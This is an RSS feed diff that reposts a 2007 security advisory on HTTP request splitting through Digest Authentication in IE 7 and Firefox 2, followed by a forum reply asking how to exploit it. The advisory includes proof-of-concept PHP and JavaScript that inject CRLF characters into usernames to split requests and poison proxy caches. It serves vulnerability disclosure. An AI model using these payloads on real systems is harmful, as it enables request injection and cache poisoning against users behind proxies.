@@ -1,0 +1,310 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "IE 7 and FF Browsers Digest Authentication Request Splitting"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "IE 7 and FF Browsers Digest Authentication Request Splitting"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>IE 7 and FF Browsers Digest Authentication Request Splitting</title>
+				<description><![CDATA[  <b>Title</b>             IE 7 and Firefox Browsers Digest Authentication
+ 		   Request Splitting
+
+ <b>Systems Affected</b>  Internet Explorer 7.0.5730.11
+		   FF 2.0.0.3
+
+ <b>Severity</b>          Medium
+
+ <b>Vendor </b>          <span class="link"> http://www.microsoft.com/</span> &<span class="link"> http://www.mozilla.com</span>
+
+ <b>Advisory</b>         <span class="link"> http://www.wisec.it/vulns.php?id=3D11</span>
+
+ <b>Authors</b>           Stefano `Wisec` Di Paola (stefano.dipaola@wisec.it)
+
+ <b>Discovery Date</b>    20070213
+
+ <b>Release Date</b>      20070425
+
+<b>I) Short description</b>
+
+Firefox and Internet Explorer are prone to Http Request Splitting when
+Digest Authentication occurs. If anyone wants to know about HTTP Request
+Splitting, HTTP Request Splitting attacks are described in various
+papers and advisories:
+
+1.<span class="link"> http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</span>
+2.<span class="link"> http://www.webappsec.org/lists/websecurity/archive/2006-07/msg00069.html</span>
+3.<span class="link"> http://download2.rapid7.com/r7-0026/</span>
+4.<span class="link"> http://www.wisec.it/docs.php?id=3D4=20</span>
+(About Auto Injection with Req.Split.)
+
+<b>II) Long description</b>
+
+As explained in Rfc2617 <span class="link"> http://www.ietf.org/rfc/rfc2617.txt</span>) Digest
+Authentication is a more secure way to exchange user credentials.
+
+Rfc uses the following example:
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+The first time the client requests the document, no Authorization
+header is sent, so the server responds with:
+
+     <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>HTTP/1.1 401 Unauthorized
+      WWW-Authenticate: Digest
+	      realm=3D"testrealm@host.com",
+	      qop=3D"auth,auth-int",
+	      nonce=3D"dcd98b7102dd2f0e8b11d0f600bfb0c093",
+	      opaque=3D"5ccc069c403ebaf9f0171e9517f40e41"</pre>
+		</div>
+
+The client may prompt the user for the username and password, after
+which it will respond with a new request, including the following
+Authorization header:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>Authorization: Digest username=3D"Mufasa",
+	realm=3D"testrealm@host.com",
+	nonce=3D"dcd98b7102dd2f0e8b11d0f600bfb0c093",
+	uri=3D"/dir/index.html",
+	qop=3Dauth,
+	nc=3D00000001,
+	cnonce=3D"0a4f113b",
+	response=3D"6629fae49393a05397450978507c4ef1",
+	opaque=3D"5ccc069c403ebaf9f0171e9517f40e41"
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--</pre>
+		</div>
+
+So there's a response by the client (browser) with username in clear.
+
+There are two ways to send credentials in html/javascript:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>XMLHttpRequest&#40;"GET","page",async, "user","pass"&#41;;</pre>
+		</div>
+
+And with img/iframes or related:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;img src=3D"http://user:pass@host/paget"&gt;</pre>
+		</div>
+
+But what if the username contains \r\n or urlencoded %0d%0a?
+
+Let's use an Evil page like this:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>--8&lt;--<span class="link"> http://evilhost/req.php</span> --8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--</pre>
+		</div>
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+header&#40;'Set-Cookie: PHPSESSID=3D6555'&#41;;
+if&#40;&#40;int&#41;intval&#40;$_COOKIE&#91;'PHPSESSID'&#93;&#41; !=3D=3D 6555&#41;{
+ header&#40;'HTTP/1.0 401 Authorization Required"&#41;;
+ header&#40;'WWW-Authenticate: Digest realm=3D"1@example.com", \
+qop=3D"auth,auth-int", nonce=3D"dcd98b7102dd2f0e8b11d0f600bfb0c093",\
+opaque=3D"5ccc069c403ebaf9f0171e9517f40e41"'&#41;;
+ header&#40;'Proxy-Connection: keep-alive'&#41;;
+} else {
+ // header&#40;"Set-Cookie: PHPSESSID=3D0"&#41;;
+ 
+header&#40;'Connection: keep-alive'&#41;;
+?&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;meta http-equiv=3D'Connection' content=3D"keep-alive"&gt;&lt;/head&gt;
+&lt;body&gt;&lt;script&gt;
+// Some Printing in order to show document DOM properties
+// in the poisoned page
+for&#40;var i in document&#41;
+document.write&#40;i+' '+eval&#40;'document.'+i&#41;+'&lt;br&gt;'&#41;;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--</pre>
+		</div>
+Which asks for a digest authentication only once.
+
+<b>III) Direct URL Authentication</b>
+
+Let's try it with Firefox:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;img  id=3D"d" src=3D"http://user%0aname:pp@evilhost/req.php"&gt;</pre>
+		</div>
+
+Let's see what happens after the first request:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+HTTP/1.1 401 Authorization Required
+Set-Cookie: PHPSESSID=3D6555
+WWW-Authenticate: Digest realm=3D"1@example.com",
+qop=3D"auth,auth-int",nonce=3D"dcd98b7102dd2f0e8b11d0f600bfb0c093",\
+opaque=3D"5ccc069c403ebaf9f0171e9517f40e41"
+Proxy-Connection: keep-alive
+Connection: keep-alive, Keep-Alive
+Content-Length: 146
+Keep-Alive: timeout=3D15, max=3D100
+Content-Type: text/html; charset=3DUTF-8
+...
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--</pre>
+		</div>
+and then Firefox resend its request:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+GET req.php HTTP/1.1
+Host: at.tack.er
+User-Agent: Mozilla/5.0 &#40;X11; U; Linux i686; it; rv:1.8.1.3&#41;
+Gecko/20060601 Firefox/2.0.0.3 &#40;Ubuntu-edgy&#41;
+Keep-Alive: 300
+Connection: keep-alive
+Authorization: Digest username=3D"user
+name", realm=3D"1@example.com",
+nonce=3D"dcd98b7102dd2f0e8b11d0f600bfb0c093", uri=3D"/req.php",
+response=3D"e398c5c7583b4ca115978c486bb766f8",
+opaque=3D"5ccc069c403ebaf9f0171e9517f40e41", qop=3Dauth, nc=3D00000001,
+cnonce=3D"58e1c23271698745"
+Cookie: PHPSESSID=3D6555
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--</pre>
+		</div>
+Everyone can see there's a splitting where the <b>%0a</b> was.
+
+The rest of the story is straightforward, an attacker could inject a
+second request, and in presence of a proxy (about 2 million people use
+it), a request splitting attack could be accomplished.=20
+
+<b>IV) Firefox Add-On</b>
+
+A wwwection could be used:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;img  src=3D"http://evilhost/www.php"&gt;</pre>
+		</div>
+
+With www.php :
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;?php
+header&#40;"Location:<span class="link"> http://user%0aname:ds@avilhost/req.php</span>"&#41;;
+?&gt;</pre>
+		</div>
+
+Or by using various wwwectors around the web.
+
+Note: Internet Explorer 7 is not vulnerable with imgs nor with other
+direct requests.
+
+<b>V) XMLHttpRequest Authentication</b>
+
+IE 7 and Firefox are both vulnerable.=20
+Let's use a standard request with XMLHttpRequest:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--
+
+x=3Dnew XMLHttpRequest&#40;&#41;;
+x.open&#40;"POST","req.php?",false,"user\r\nname","pass"&#41;;
+x.setRequestHeader&#40;"Proxy-Connection","keep-alive"&#41;;
+x.onreadystatechange=3Dfunction &#40;&#41;{
+   if &#40;x.readyState =3D=3D 4&#41;{
+
+  }
+ 
+// The payload with a request to a page with evil content
+x.send&#40;"RequestPayload"&#41;;
+
+--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--8&lt;--</pre>
+		</div>
+
+This will result in a similar splitting like the one with images tags.
+
+What you could do with these splittings? A lot, one for all is that in
+presence of a proxy, local cache could be poisoned. But for some more
+attack have a look at references.
+
+
+Note: there is some difference between IE and Firefox, but i'll let you
+as homework
+
+<b>CREDIT</b>
+------
+
+Stefano di Paola is credited with the discovery of this vulnerability.
+
+<b>LEGAL NOTICES</b>
+--------------
+
+Copyright (c) 2007 Stefano di Paola
+
+Note: this exploit is DUAL LICENSED,=20
+1. if you'll use it for personal and non-profit purposes you can=20
+   apply GPL v2 and above.=20
+  =20
+2. In the case you plain to:=20
+   a. use our code in any commercial context
+   b. implement this code in your non-GPL application
+   c. use this code during a Penetration Test
+   d. make any profit from it=20
+  =20
+  you need to contact me in order to obtain a _commercial license_.
+
+For more Informations about Dual Licensing:<span class="link"> http://producingoss.com/html-chunk/dual-licensing.html</span>
+
+Permission is granted for the redistribution of this alert
+electronically. It may not be edited in any way without my express
+written consense. If you wish to reprint the whole or any
+part of this alert in any other medium other than electronically, please
+email me for permission.
+
+Disclaimer: The information in the advisory is believed to be accurate
+at the time of publishing based on currently available information. Use
+of the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with regard to this information. Neither the
+author nor the publisher accepts any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+
+
+--=20
+...oOOo...oOOo....
+Stefano Di Paola
+Software & Security Engineer
+
+Web: www.wisec.it
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/9849.hva#56604</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/9849.hva#56604</link>
+				<pubDate><![CDATA[Tue, 1 May 2007 07:31:03]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>IE 7 and FF Browsers Digest Authentication Request Splitting</title>
+				<description><![CDATA[ Rồi cái này làm sao mà khai thác vậy anh comale ơi, đọc tiếng Anh nhức hết cả mắt?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/9849.hva#56668</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/9849.hva#56668</link>
+				<pubDate><![CDATA[Tue, 1 May 2007 15:44:50]]> GMT</pubDate>
+				<author><![CDATA[ lamhoang20002000]]></author>
+			</item>
+	</channel>
+</rss>
